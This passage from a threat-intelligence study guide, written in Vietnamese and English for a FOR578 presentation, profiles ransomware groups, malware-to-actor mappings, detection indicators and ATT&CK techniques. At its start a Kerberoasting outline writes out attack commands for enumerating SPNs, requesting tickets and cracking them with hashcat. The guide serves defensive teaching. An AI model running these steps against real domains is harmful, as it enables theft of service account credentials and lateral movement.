│                                                         │
│ ① Enumerate SPNs                                        │
│    setspn -Q */*                                        │
│    └→ Find service accounts với SPNs                    │
│                                                         │
│ ② Request TGS tickets                                   │
│    Invoke-Kerberoast (PowerView)                        │
│    └→ Request ticket cho target SPN                     │
│    └→ Ticket encrypted với service account hash         │
│                                                         │
│ ③ Extract ticket                                        │
│    └→ Export từ memory                                  │
│    └→ Format cho cracking                               │
│                                                         │
│ ④ Offline crack                                         │
│    hashcat -m 13100 ticket.txt wordlist.txt             │
│    └→ Recover plaintext password                        │
│                                                         │
│ ⑤ Use credentials                                       │
│    └→ Access service account resources                  │
│    └→ Lateral movement                                  │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### BloodHound Query
"Find Kerberoastable Accounts" - identifies targets


[↑ Quay lại mục lục](#muc-luc)

---

# 4. RANSOMWARE OPERATIONS

---

## Ryuk

| Attribute | Value |
|-----------|-------|
| **Operator** | Wizard Spider |
| **First Seen** | August 2018 |
| **Precursors** | TrickBot, Emotet, BazarLoader |
| **Average Ransom** | $1M+ (big game hunting) |
| **Notable Targets** | Hospitals, municipalities, enterprises |

### Kill Chain
```
Emotet/TrickBot → Cobalt Strike → BloodHound → DC Compromise → Ryuk
Timeline: As fast as 5 hours
```


[↑ Quay lại mục lục](#muc-luc)

---

## DoppelPaymer

| Attribute | Value |
|-----------|-------|
| **Operator** | Evil Corp (INDRIK SPIDER) |
| **First Seen** | 2019 |
| **Precursors** | Dridex, RDP compromise |
| **Relationship** | Code shared với BitPaymer |
| **Tactics** | Double extortion (encrypt + data leak) |

### Intelligence Note
> Seeing Dridex → Expect DoppelPaymer, not Ryuk
> Different threat actor = Different investigation approach


[↑ Quay lại mục lục](#muc-luc)

---

## Conti

| Attribute | Value |
|-----------|-------|
| **Operator** | Wizard Spider |
| **First Seen** | 2020 |
| **Model** | Ransomware-as-a-Service (RaaS) |
| **Status** | Officially disbanded 2022, members scattered |
| **Notable** | Leaked playbooks, affiliate program |


[↑ Quay lại mục lục](#muc-luc)

---

# 5. THREAT ACTOR GROUPS

| Group Name | Aliases | Origin | Malware | Ransomware |
|------------|---------|--------|---------|------------|
| **Wizard Spider** | UNC1878, TEMP.MixMaster | Russia | TrickBot, BazarLoader | Ryuk, Conti |
| **Evil Corp** | INDRIK SPIDER, TA505 | Russia | Dridex | BitPaymer, DoppelPaymer, WastedLocker |
| **Mealybug** | TA542, Mummy Spider | Ukraine | Emotet | (Loader only) |
| **TA570** | - | Unknown | QakBot | Various RaaS |


[↑ Quay lại mục lục](#muc-luc)

---

# 6. QUICK REFERENCE TABLES

## Malware → Threat Actor → Ransomware Mapping

```
┌─────────────────┬──────────────────┬─────────────────────┐
│    Malware      │   Threat Actor   │     Ransomware      │
├─────────────────┼──────────────────┼─────────────────────┤
│ TrickBot        │ Wizard Spider    │ Ryuk, Conti         │
│ Emotet          │ Mealybug         │ (Loader for above)  │
│ BazarLoader     │ Wizard Spider    │ Ryuk, Conti         │
│ Dridex          │ Evil Corp        │ BitPaymer,          │
│                 │                  │ DoppelPaymer        │
│ QakBot          │ TA570            │ Various RaaS        │
│ IcedID          │ TA551            │ Various RaaS        │
└─────────────────┴──────────────────┴─────────────────────┘
```

## Initial Access → Ransomware Timeline

| Operation | Initial Access | Time to Ransomware |
|-----------|----------------|-------------------|
| Ryuk (typical) | TrickBot/Emotet | 5 hours - 2 days |
| Ryuk (fast) | Cobalt Strike | 17 minutes |
| DoppelPaymer | RDP + Dridex | 1-7 days |
| Conti (affiliate) | Varies | Hours to weeks |


[↑ Quay lại mục lục](#muc-luc)

---

# 7. DETECTION CHEAT SHEETS

## Process-Based Detection

| Indicator | Concern |
|-----------|---------|
| PowerShell với -enc | Encoded commands |
| regsvr32.exe spawned by Office | Macro execution |
| wermgr.exe với network activity | Process hollowing |
| svchost.exe với wrong parent | Injection |
| certutil.exe downloading | File download abuse |

## Network-Based Detection

| Indicator | Concern |
|-----------|---------|
| Port 50050 outbound | Cobalt Strike default |
| DNS TXT queries, high volume | DNS tunneling |
| /wp-admin/ patterns | Emotet C2 |
| P2P traffic patterns | Dridex botnet |
| SMB scanning (137, 445) | BloodHound/lateral movement |

## Memory Indicators

| Indicator | Malware |
|-----------|---------|
| 0xBEEF in process memory | Cobalt Strike Beacon |
| wermgr.exe hollow | TrickBot |
| Unsigned code in signed process | Process injection |


[↑ Quay lại mục lục](#muc-luc)

---

# 8. MITRE ATT&CK QUICK REFERENCE

## Most Common Techniques in Ransomware Operations

| Technique ID | Name | Used By |
|--------------|------|---------|
| T1566.001 | Phishing: Attachment | All |
| T1059.001 | PowerShell | TrickBot, Emotet, CS |
| T1055.012 | Process Hollowing | TrickBot |
| T1021.002 | SMB/Windows Admin Shares | Lateral movement |
| T1078 | Valid Accounts | Post-compromise |
| T1486 | Data Encrypted for Impact | Ransomware |
| T1071.001 | Web Protocols | C2 |
| T1053.005 | Scheduled Task | Persistence |


[↑ Quay lại mục lục](#muc-luc)

---

# 9. RESOURCES

## Official Documentation
- CISA TrickBot Advisory: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-076a
- CISA Emotet Advisory: https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a
- CISA Dridex Advisory: https://www.cisa.gov/news-events/cybersecurity-advisories/aa19-339a

## Community Resources
- LOLBAS Project: https://lolbas-project.github.io
- GTFOBins (Linux): https://gtfobins.github.io
- BloodHound Docs: https://bloodhound.specterops.io
- MITRE ATT&CK: https://attack.mitre.org

## Threat Intelligence
- Malpedia: https://malpedia.caad.fkie.fraunhofer.de
- Red Canary Threat Detection Report: https://redcanary.com/threat-detection-report

---

*Tài liệu này được tạo để hỗ trợ thuyết trình FOR578 CTI Section 4. Cập nhật lần cuối: December 2025*

[↑ Quay lại mục lục](#muc-luc)
